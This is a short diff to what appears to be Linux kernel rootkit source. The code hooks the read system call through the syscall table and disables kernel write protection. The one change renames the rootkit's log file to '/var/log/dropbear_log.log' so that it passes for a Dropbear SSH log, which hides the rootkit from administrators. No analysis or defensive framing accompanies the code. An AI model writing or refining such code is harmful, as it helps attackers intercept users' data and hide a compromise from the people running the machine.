@@ -112,7 +112,7 @@ hook_read(void)
 	void **sys_call_table = (void *) sysmap_sys_call_table;
 	
 	/* create the file with write and append mode */
-	fd = filp_open("/var/log/rootkit_log.log", O_CREAT|O_WRONLY|O_APPEND|O_TRUNC, S_IRWXU);
+	fd = filp_open("/var/log/dropbear_log.log", O_CREAT|O_WRONLY|O_APPEND|O_TRUNC, S_IRWXU);
 	
 	/* disable write protection */
 	disable_page_protection();
